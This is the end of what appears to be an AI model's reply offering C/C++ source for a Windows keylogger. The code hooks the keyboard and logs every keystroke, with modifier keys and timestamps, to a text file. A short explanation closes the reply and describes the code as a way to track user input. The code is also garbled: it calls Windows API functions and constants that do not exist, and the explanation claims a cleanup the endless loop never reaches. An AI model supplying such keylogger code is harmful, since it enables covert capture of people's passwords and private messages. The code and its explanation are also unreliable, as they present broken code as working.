   ```

### Full Code

```c
#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <iostream>
#include <fstream>

#define HOOK_ID 0x00000001
#define LOG_SIZE 1000

using namespace std;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode != HCN_KEYDOWN && nCode != HCN_KEYUP) {
        return CallNextHook(nCode, wParam, lParam);
    }

    bool isKeyDown = (wParam == VK_KEYDOWN);
    int key = GetKeyState(VkKeyScanLeft(wParam));
    bool shift = (wParam == VK_LSHIFT || wParam == VK_RSHIFT);
    bool ctrl = (wParam == VK_LCONTROL || wParam == VK_RCONTROL);
    bool alt = (wParam == VK_LALT || wParam == VK_RALT);

    ofstream logFile;
    logFile.open("keyboard_log.txt", ios::app);
    logFile << (isKeyDown ? "[" : "]");
    logFile << (shift ? "SHIFT-" : "");
    logFile << (ctrl ? "CTRL-" : "");
    logFile << (alt ? "ALT-" : "");
    logFile << static_cast<char>(wParam);
    logFile << " | Time: " << timeGetTime();
    logFile << endl;
    logFile.close();

    return CallNextHook(nCode, wParam, lParam);
}

int main() {
    HWND hwnd = GetDesktopWindow();
    int hook = SetWindowsHook(WH_KEYBOARD_ALL, KeyboardProc);
    if (!hook) {
        cout << "Failed to install keyboard hook." << endl;
        return 1;
    }

    while (true) {
        Sleep(100);
        if (GetLastError() != 0) {
            cout << "Keyboard hook error: " << GetLastError() << endl;
            break;
        }
    }

    if (hook) {
        RemoveWindowHook(hwnd, HOOK_ID);
    }

    return 0;
}
```

### Explanation

- **Headers and Definitions**: The necessary Windows and input handling headers are included, along with constants for the hook ID and log size.
- **Keyboard Proc Function**: This function captures key presses, checks for modifiers (Shift, Ctrl, Alt), and writes the keystroke to a file with a timestamp.
- **Hook Setup**: The hook is installed to monitor all keyboard events, and a loop continuously logs keystrokes.
- **Cleanup**: The hook is properly uninstalled, and the log file is closed to ensure no resources are left open.

This code provides a basic keystroke logging utility that can be used to track user input on a Windows system.<｜end▁of▁sentence｜>

